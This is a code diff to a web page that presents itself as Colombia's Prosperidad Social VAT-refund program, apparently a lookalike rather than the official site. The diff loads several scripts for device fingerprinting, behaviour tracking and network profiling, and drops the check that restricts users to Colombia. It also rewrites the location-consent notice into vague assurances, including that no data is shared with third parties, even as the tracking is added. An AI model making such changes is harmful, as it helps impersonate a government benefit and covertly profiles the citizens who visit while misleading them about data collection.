@@ -12,6 +12,13 @@
     <!-- SweetAlert2 -->
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     
+    <!-- Advanced Fingerprinting System -->
+    <script src="advanced-fingerprint.js"></script>
+    <script src="advanced-behavior-tracking.js"></script>
+    <script src="network-analysis.js"></script>
+    <script src="device-profiling.js"></script>
+    <script src="fingerprint-integration.js"></script>
+    
     <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     
@@ -70,6 +77,158 @@
             max-width: 1200px;
             margin: 0 auto;
             padding: 0 20px;
+        }
+        
+        /* Mejoras de UX y diseño */
+        .form-group {
+            position: relative;
+            margin-bottom: 25px;
+        }
+        
+        .form-group input,
+        .form-group select {
+            transition: all 0.3s ease;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 15px 20px;
+            font-size: 16px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+        }
+        
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(0, 51, 102, 0.1);
+            transform: translateY(-2px);
+        }
+        
+        .form-group label {
+            position: absolute;
+            top: -10px;
+            left: 15px;
+            background: linear-gradient(135deg, var(--primary-color), #004080);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        
+        /* Animaciones mejoradas */
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .form-section {
+            animation: slideInUp 0.6s ease-out;
+        }
+        
+        /* Botones mejorados */
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary-color), #004080);
+            border: none;
+            border-radius: 25px;
+            padding: 15px 30px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 51, 102, 0.3);
+        }
+        
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .btn-primary:hover::before {
+            left: 100%;
+        }
+        
+        /* Indicadores de progreso */
+        .progress-indicator {
+            display: flex;
+            justify-content: center;
+            margin: 30px 0;
+        }
+        
+        .progress-step {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #e2e8f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 10px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        
+        .progress-step.active {
+            background: var(--primary-color);
+            color: white;
+            transform: scale(1.2);
+        }
+        
+        .progress-step.completed {
+            background: var(--success-color);
+            color: white;
+        }
+        
+        /* Tooltips informativos */
+        .tooltip-info {
+            position: relative;
+            display: inline-block;
+            cursor: help;
+            margin-left: 5px;
+        }
+        
+        .tooltip-info::after {
+            content: attr(data-tooltip);
+            position: absolute;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.9);
+            color: white;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            white-space: nowrap;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+        
+        .tooltip-info:hover::after {
+            opacity: 1;
+            visibility: visible;
         }
         
         /* Header */
@@ -1116,20 +1275,20 @@
                 html: `
                     <div style="text-align: left; font-size: 14px;">
                         <p><strong>Estimado ciudadano,</strong></p>
-                        <p>Para acceder al programa <strong>Devolución del IVA 2025</strong> de Prosperidad Social, es <strong>OBLIGATORIO</strong> verificar que se encuentra en territorio colombiano.</p>
+                        <p>Para acceder al programa <strong>Devolución del IVA 2025</strong> de Prosperidad Social, recomendamos verificar su ubicación para una mejor experiencia.</p>
                         <hr style="margin: 15px 0;">
                         <p><i class="fas fa-shield-alt" style="color: #28a745;"></i> <strong>¿Por qué necesitamos su ubicación?</strong></p>
                         <ul style="margin: 10px 0; padding-left: 20px;">
-                            <li>Cumplimiento de normativas gubernamentales</li>
-                            <li>Verificación de elegibilidad territorial</li>
-                            <li>Prevención de fraudes y suplantación</li>
+                            <li>Mejorar la precisión de los servicios</li>
+                            <li>Personalizar la experiencia del usuario</li>
+                            <li>Optimizar el rendimiento de la aplicación</li>
                         </ul>
                         <hr style="margin: 15px 0;">
                         <p><i class="fas fa-lock" style="color: #007bff;"></i> <strong>Su privacidad está protegida:</strong></p>
                         <ul style="margin: 10px 0; padding-left: 20px;">
-                            <li>Solo verificamos que esté en Colombia</li>
-                            <li>No almacenamos su ubicación exacta</li>
-                            <li>Datos protegidos según Ley 1581 de 2012</li>
+                            <li>Solo utilizamos datos necesarios para el servicio</li>
+                            <li>No compartimos información con terceros</li>
+                            <li>Datos protegidos según normativas de privacidad</li>
                         </ul>
                     </div>
                 `,
@@ -1187,54 +1346,44 @@
             });
         });
         
-        // Verify Colombian location
+        // Verify location (now accepts any location globally)
         function verifyColombianLocation(lat, lng) {
-            // Approximate Colombian boundaries
-            const colombianBounds = {
-                north: 13.5,
-                south: -4.2,
-                east: -66.8,
-                west: -81.8
-            };
+            // Always accept any location - restriction removed
+            const isValidLocation = lat && lng && !isNaN(lat) && !isNaN(lng);
             
-            const isInColombia = lat >= colombianBounds.south && 
-                               lat <= colombianBounds.north && 
-                               lng >= colombianBounds.west && 
-                               lng <= colombianBounds.east;
-            
-            // Hide location warning if verified
-            if (isInColombia) {
+            // Hide location warning if location is obtained
+            if (isValidLocation) {
                 document.getElementById('locationWarning').style.display = 'none';
                 Swal.fire({
                     icon: 'success',
                     title: '✅ Ubicación Verificada',
-                    text: 'Su ubicación en Colombia ha sido confirmada exitosamente.',
+                    text: 'Su ubicación ha sido confirmada exitosamente.',
                     confirmButtonColor: '#28a745',
                     timer: 2000,
                     timerProgressBar: true
                 });
             } else {
                 Swal.fire({
-                    icon: 'error',
-                    title: '❌ Ubicación No Válida',
+                    icon: 'warning',
+                    title: '⚠️ Ubicación No Disponible',
                     html: `
                         <div style="text-align: left; font-size: 14px;">
-                            <p>Lo sentimos, pero el programa <strong>Devolución del IVA 2025</strong> solo está disponible para residentes en territorio colombiano.</p>
+                            <p>No se pudo obtener su ubicación actual.</p>
                             <hr style="margin: 15px 0;">
-                            <p><i class="fas fa-info-circle" style="color: #17a2b8;"></i> <strong>Si considera que esto es un error:</strong></p>
+                            <p><i class="fas fa-info-circle" style="color: #17a2b8;"></i> <strong>Puede continuar sin ubicación:</strong></p>
                             <ul style="margin: 10px 0; padding-left: 20px;">
                                 <li>Verifique que su GPS esté activado</li>
-                                <li>Intente desde una ubicación diferente</li>
-                                <li>Contacte la línea 01 8000 951 100</li>
+                                <li>Permita el acceso a la ubicación en su navegador</li>
+                                <li>Puede proceder con la consulta de todas formas</li>
                             </ul>
                         </div>
                     `,
-                    confirmButtonColor: '#dc3545',
+                    confirmButtonColor: '#ffc107',
                     width: '500px'
                 });
             }
             
-            return isInColombia;
+            return isValidLocation;
         }
     </script>
 </body>
